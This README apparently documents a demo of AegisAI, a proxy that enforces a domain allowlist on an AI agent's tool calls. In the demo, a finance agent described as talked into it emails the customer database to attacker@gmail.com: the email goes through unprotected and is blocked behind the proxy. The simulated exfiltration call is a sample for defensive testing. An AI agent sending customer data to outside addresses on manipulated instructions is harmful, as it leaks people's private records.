# External agent demo — "AegisAI protects an agent that wasn't written with AegisAI"

This folder holds a small finance agent in [`agent.py`](agent.py) that **imports
nothing from AegisAI**. It has two tools — `send_email` and `query_database` —
and this turn its "model" has been talked into emailing the customer database to
`attacker@gmail.com`.

We run the *same agent* two ways and watch what happens.

```
Test A   agent ───────────────▶ tool          💥 send_email ALLOWED  (data exfiltrated)
Test B   agent ─▶ Aegis proxy ─▶ tool          🚫 send_email BLOCKED
```

## Test A — the agent on its own

```bash
python agent.py
```

Nothing is watching, so both tool calls run. The customer database is emailed to
an external address:

```
=== Finance agent — DIRECT (no security) ===

     ↳ executed: rows: [{'customer': 'ACME', 'balance': 42000}]
     ↳ executed: EMAIL SENT to attacker@gmail.com with attachment 'customers.csv'.

  💥 RESULT: customer data was emailed to an external address.
```

## Test B — the same agent, now behind AegisAI

Start the proxy with the bundled policy (from the repo root or this folder):

```bash
aegis proxy --config examples/external-agent/aegis-agent.yaml --port 9000
# or, without installing the CLI:
python -m app.platform.cli proxy --config examples/external-agent/aegis-agent.yaml --port 9000
```

Then point the agent at it:

```bash
python agent.py --aegis http://localhost:9000
```

`query_database` is allowed, but the email to `gmail.com` is refused because the
policy only allows `company.com`:

```
=== Finance agent — THROUGH AEGIS (http://localhost:9000) ===

  ✅ ALLOWED  query_database(query='SELECT * FROM customers')
     ↳ executed: rows: [{'customer': 'ACME', 'balance': 42000}]
  🚫 BLOCKED  send_email(to='attacker@gmail.com', subject='quarterly numbers', attachment='customers.csv')
             reason: Domain 'gmail.com' is not in the allowed-domains for finance-agent.
             code  : untrusted_external_destination  [registry:PASS, policy:PASS, domain:FAIL]

  🛡️  RESULT: no sensitive data left the building.
```

## What this proves

The agent's code never changed between Test A and Test B. The only difference is
*where its tool calls go*. By routing them through the Aegis proxy — which
enforces a declarative `aegis.yaml` the agent has never seen — AegisAI stops the
exfiltration at the `domain` checkpoint.

That is the universal runtime integration layer: **take an existing agent, don't
rewrite its security logic, and route its AI/tool interactions through AegisAI.**
